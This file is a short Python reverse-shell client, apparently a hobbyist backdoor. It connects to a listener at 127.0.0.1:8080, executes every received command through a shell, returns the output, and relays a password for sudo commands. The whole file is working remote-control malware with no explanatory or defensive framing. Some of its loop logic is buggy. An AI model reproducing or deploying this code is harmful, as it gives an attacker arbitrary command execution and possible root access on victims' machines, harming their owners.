import socket,subprocess

host = "127.0.0.1"
port = 8080
buff = 2048	
client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)

client_socket.connect((host,port))
def komut(x):
    command = subprocess.check_output(x, shell=True)
    if not command:
        client_socket.send("Command succesfully executed.")
    else:
        client_socket.send(str(command) + "\nCommand succesfully executed.")

while True:
    received_data = client_socket.recv(buff)
    if received_data == 'quit':
        client_socket.close()
    else:
        if "sudo" in received_data:
            komut(received_data)
            client_socket.send("PAR0LA")
            received_data = client_socket.recv(buff)
            komut(received_data)
        else:
            komut(received_data)